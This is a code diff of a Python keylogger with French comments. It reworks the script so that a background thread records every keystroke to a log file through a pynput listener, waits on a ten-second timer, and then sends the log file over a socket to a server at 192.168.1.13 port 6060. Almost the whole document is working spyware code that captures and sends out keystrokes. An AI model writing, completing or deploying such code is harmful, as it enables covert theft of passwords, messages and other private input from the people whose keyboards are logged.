@@ -10,9 +10,12 @@ fin = False
 def on_press(key):
     logging.info(str(key))
  
-def keylogger(): 
-    with Listener(on_press=on_press) as listener :
-        listener.join()
+def tracing(): 
+    if not fin:
+        logging.basicConfig(filename=("keylogs.txt"),filemode='w' ,
+                            format='%(asctime)s: %(levelname)s: %(message)s',level=logging.DEBUG)
+
+        Listener(on_press=on_press).start()
 
 def send_file(filename, server_address, server_port):
     with open(filename, 'rb') as file:
@@ -21,18 +24,27 @@ def send_file(filename, server_address, server_port):
         s.connect((server_address, server_port))
         s.sendall(file_data)
 
-def main():
-    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
-    filename = "keylog.txt" 
-    server_address = "192.168.1.13"  # Adresse IP du serveur
-    server_port = 6060  # Port du serveur
-    keylogger()
-    #time.sleep(2)
-    send_file(filename, server_address, server_port)
+def minuteur(dead):
+    global fin
 
-    # Attendre l'ordre du serveur
+    i = 0
+    while i < dead :
+        print(i)
+        time.sleep(1)
+        i+=1
+        # a = input("press 'a' pour redemarer le minuteur")
+        # if a == 'a':
+        #     i=0
+        # elif a =='b':
+        #     fin = True
+        #     break
+   
     
-    os.remove(filename)
-
-if __name__ == "__main__":
-    main()
+threading.Thread(target=tracing,daemon=True).start()
+filename = "keylogs.txt" 
+server_address = "192.168.1.13"  # Adresse IP du serveur
+server_port = 6060  # Port du serveur
+minuteur(10)
+send_file(filename, server_address, server_port)
+#os.remove(filename)
+fin = True
